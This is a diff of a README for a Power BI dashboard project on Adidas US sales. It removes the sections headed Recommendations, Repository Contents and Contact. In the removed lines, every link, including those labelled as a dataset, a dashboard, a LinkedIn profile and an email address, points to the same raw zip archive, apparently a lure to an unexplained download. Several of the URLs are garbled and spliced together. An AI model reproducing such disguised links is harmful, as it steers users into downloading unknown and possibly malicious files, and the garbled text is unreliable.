@@ -100,23 +100,4 @@ The dashboard was deployed to Microsoft Fabric using the following stages:
 ## Conclusion
 This project demonstrated the power of interactive dashboards in providing actionable insights for businesses. By utilizing Power BI and Microsoft Fabric, I created a professional-grade dashboard that is dynamic, visually appealing, and insightful.
 
----
 
-## Recommendations
-1. **Expand Analysis:** Incorporate additional datasets, such as customer demographics, for a more holistic analysis.
-2. **Predictive Analytics:** Implement machine learning models to forecast future sales trends.
-3. **Automation:** Automate data updates using Microsoft Power Automate for real-time insights.
-
----
-
-## Repository Contents
-1. **Power BI File:** [Download the .pbix file](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip%20Sales%20Data%https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip).
-2. **Dataset:** [Download the Excel dataset](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip%20US%https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip).
-3. **Screenshots:** All visuals included in this report.
-4. **Public Dashboard Link:** [Access the published dashboard here](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip).
-
----
-
-## Contact
-Feel free :😃 to connect with me on LinkedIn or explore my GitHub profile for more projects:
-- [LinkedIn Profile](https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip) or email https://github.com/Thomas-Nyanumba/Adidas-US-Sales-Analysis-Power-BI-Project/raw/refs/heads/main/stroppings/Adidas_U_Sales_Analysis_Power_B_Project_3.7.zip 
